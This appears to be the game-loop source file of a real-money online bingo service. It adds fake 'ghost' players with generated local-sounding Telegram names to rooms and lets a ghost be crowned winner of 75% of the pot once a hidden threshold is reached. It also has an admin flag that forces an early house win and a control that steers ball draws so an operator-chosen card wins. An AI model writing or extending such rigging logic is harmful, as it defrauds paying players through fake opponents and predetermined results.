import time
import random
import traceback
from django.core.management.base import BaseCommand
from django.utils import timezone
from django.db import close_old_connections  
from channels.layers import get_channel_layer 
from asgiref.sync import async_to_sync           
from bingo.models import GameRound, GameControl, PermanentCard, User

# ==========================================
# 🎲 DYNAMIC GHOST BOARD GENERATOR
# ==========================================
def generate_ghost_winning_board(called):
    board = [[0]*5 for _ in range(5)]
    cols = [list(range(1, 16)), list(range(16, 31)), list(range(31, 46)), list(range(46, 61)), list(range(61, 76))]
    for n in called:
        if 1 <= n <= 15 and n in cols[0]: cols[0].remove(n)
        elif 16 <= n <= 30 and n in cols[1]: cols[1].remove(n)
        elif 31 <= n <= 45 and n in cols[2]: cols[2].remove(n)
        elif 46 <= n <= 60 and n in cols[3]: cols[3].remove(n)
        elif 61 <= n <= 75 and n in cols[4]: cols[4].remove(n)
    for c in cols: random.shuffle(c)
    for r in range(5):
        for c in range(5):
            if r == 2 and c == 2: board[r][c] = "FREE"
            else: board[r][c] = cols[c].pop()
                
    called_b = [x for x in called if 1 <= x <= 15]
    called_i = [x for x in called if 16 <= x <= 30]
    called_g = [x for x in called if 46 <= x <= 60]
    called_o = [x for x in called if 61 <= x <= 75]
    
    if called_b: board[0][0] = random.choice(called_b)
    if called_i: board[1][1] = random.choice(called_i)
    if called_g: board[3][3] = random.choice(called_g)
    if called_o: board[4][4] = random.choice(called_o)
    return board

# ==========================================
# 👻 SMART GHOST PLAYER ENGINE (GOD MODE)
# ==========================================
def get_ghost_card_count(tier):
    if tier == 100: default_min, default_max = 0, 0
    elif tier in [40, 50]: default_min, default_max = 0, 2
    elif tier in [20, 30]: default_min, default_max = 0, 4
    else: default_min, default_max = 3, 15

    ghost_min = default_min
    ghost_max = default_max
    
    try:
        config_user = User.objects.filter(username=f"sys_ghost_{tier}").first()
        if config_user and config_user.real_name and "," in config_user.real_name:
            parts = config_user.real_name.split(",")
            ghost_min = int(parts[0])
            ghost_max = int(parts[1])
    except Exception: pass
    
    if ghost_min > ghost_max: ghost_min, ghost_max = ghost_max, ghost_min
    max_allowed_in_room = 990 if tier == 10 else 490
    safe_max = min(ghost_max, max_allowed_in_room)
    safe_min = min(ghost_min, safe_max)

    return random.randint(safe_min, safe_max)

def inject_ghost_players(room, tier):
    ghost_count = get_ghost_card_count(tier)
    if ghost_count == 0: return False
    
    fake_names = [
        "tg_Abebe", "tg_Dawit", "tg_Chala", "tg_Bereket", "tg_Ephrem", 
        "tg_Sisay", "tg_Biniyam", "tg_Mesfin", "tg_Yonatan", "tg_Habtamu", 
        "tg_Kaleb", "tg_Nahom", "tg_Eyob", "tg_Tewodros", "tg_Natnael", "tg_Yosef",
        "tg_Henok", "tg_Abel", "tg_Matiyas", "tg_Kidus", "tg_Bruk"
    ]
    
    max_cards = 1000 if tier == 10 else 500
    taken_cards = set()
    if room.players:
        for p_cards in room.players.values():
            if isinstance(p_cards, list):
                for c in p_cards: taken_cards.add(int(c))
            else:
                taken_cards.add(int(p_cards))
                
    available = [c for c in range(1, max_cards + 1) if c not in taken_cards]
    if len(available) < ghost_count: ghost_count = len(available)
    if ghost_count <= 0: return False
        
    random.shuffle(available)
    selected_cards = available[:ghost_count]
    players_dict = room.players or {} 
    
    for card in selected_cards:
        bot_name = random.choice(fake_names) + str(random.randint(10, 9999))
        players_dict[bot_name] = [card]
        
    room.players = players_dict
    room.save(update_fields=['players'])
    return True


class Command(BaseCommand):
    def handle(self, *args, **options):
        self.stdout.write("BIGGEST BINGO DEALER: ENGINE STARTED WITH GHOST PLAYERS")
        TIERS = [10, 20, 30, 40, 50, 100]
        channel_layer = get_channel_layer() 

        while True:
            close_old_connections() 
            
            try:
                now = timezone.now()
                control = GameControl.objects.first() if GameControl.objects.exists() else None

                for tier in TIERS:
                    active_rooms = GameRound.objects.filter(bet_amount=tier).exclude(status__in=["ENDED", "ANNOUNCED"]).order_by('created_at')
                    
                    if not active_rooms.exists():
                        new_room = GameRound.objects.create(bet_amount=tier, status="LOBBY")
                        inject_ghost_players(new_room, tier)
                        continue
                    
                    if active_rooms.count() > 1:
                        keeper = active_rooms.first()
                        GameRound.objects.filter(bet_amount=tier).exclude(id=keeper.id).exclude(status__in=["ENDED", "ANNOUNCED"]).delete()
                        room = keeper
                    else:
                        room = active_rooms.first()
                    
                    if room.status == "LOBBY":
                        if not room.players: inject_ghost_players(room, tier)
                        
                        elapsed = (now - room.created_at).total_seconds()
                        if elapsed >= 60:
                            if not room.players:
                                room.created_at = now  
                                room.save(update_fields=['created_at'])
                            else:
                                room.status = "ACTIVE"
                                room.save(update_fields=['status'])
                    
                    elif room.status == "ACTIVE":
                        called = room.called_numbers
                        
                        ghosts = []
                        if room.players:
                            ghosts = [p for p in room.players.keys() if str(p).startswith("tg_") and not str(p).replace("tg_", "").isdigit()]
                        
                        win_threshold = 75
                        if ghosts: win_threshold = 34 + (room.id % 26) 
                        
                        # --- 💀 THE BLOW REQUEST (HOUSE WIN OVERRIDE DB CHECK) ---
                        house_win_requested = False
                        try:
                            hw_user = User.objects.filter(username=f"sys_housewin_{tier}").first()
                            if hw_user and hw_user.bot_state == "ACTIVE":
                                house_win_requested = True
                        except Exception: pass

                        if house_win_requested and ghosts:
                            if len(called) >= 5:
                                win_threshold = len(called) + 1
                                try:
                                    hw_user.bot_state = "IDLE"
                                    hw_user.save(update_fields=['bot_state'])
                                except: pass
                        # --------------------------------------------------------
                            
                        if len(called) < win_threshold:
                            remaining = [n for n in range(1, 76) if n not in called]
                            next_ball = None
                            
                            if control and getattr(control, 'forced_winner_card_number', None) and getattr(control, 'daily_forced_wins', 0) < 30:
                                target_card_num = control.forced_winner_card_number
                                card_is_in_room = False
                                if room.players:
                                    for p_cards in room.players.values():
                                        if isinstance(p_cards, list) and target_card_num in p_cards: card_is_in_room = True; break
                                        elif p_cards == target_card_num: card_is_in_room = True; break
                                
                                if card_is_in_room:
                                    try:
                                        target_card = PermanentCard.objects.get(card_number=target_card_num)
                                        board_nums = [num for row in target_card.board for num in row if isinstance(num, int)]
                                        needed_numbers = [n for n in board_nums if n not in called]
                                        
                                        if needed_numbers: next_ball = random.choice(needed_numbers)
                                        if len(needed_numbers) <= 1:
                                            control.daily_forced_wins += 1
                                            control.forced_winner_card_number = None
                                            control.save()
                                    except Exception: pass

                            if next_ball is None: next_ball = random.choice(remaining)
                            called.append(next_ball)
                            room.called_numbers = called
                            room.save(update_fields=['called_numbers'])

                            async_to_sync(channel_layer.group_send)(
                                f'game_{room.id}',
                                {'type': 'bingo_message', 'message': {'action': 'new_ball', 'ball': next_ball, 'called_count': len(called)}}
                            )
                        
                        else:
                            try:
                                if getattr(room, 'winner_username', None) is None and ghosts:
                                    winner_name = random.choice(ghosts)
                                    room.winner_username = winner_name
                                    
                                    total_cards = sum(len(c) if isinstance(c, list) else 1 for c in room.players.values())
                                    
                                    calc_prize = (float(total_cards) * float(room.bet_amount)) * 0.75
                                    room.winner_prize = int(calc_prize) 
                                    
                                    w_cards = room.players[winner_name]
                                    winning_num = w_cards[0] if isinstance(w_cards, list) else w_cards
                                    room.winning_card = str(winning_num)
                                    
                                    try:
                                        try: real_card = PermanentCard.objects.get(card_number=int(winning_num))
                                        except: real_card = PermanentCard.objects.get(id=int(winning_num))
                                        room.winning_board = real_card.board
                                    except Exception:
                                        room.winning_board = generate_ghost_winning_board(called)

                            except Exception as e:
                                print(f"⚠️ Warning: Ghost crowning skipped due to error: {e}")

                            room.status = "ENDED"
                            room.finished_at = now
                            room.save()
                            
                            async_to_sync(channel_layer.group_send)(
                                f'game_{room.id}',
                                {'type': 'bingo_message', 'message': {'action': 'game_ended'}}
                            )

            except Exception as e:
                self.stdout.write(f"\n🔥 FATAL ENGINE ERROR PREVENTED: {e}\n")
                traceback.print_exc()
            
            time.sleep(3)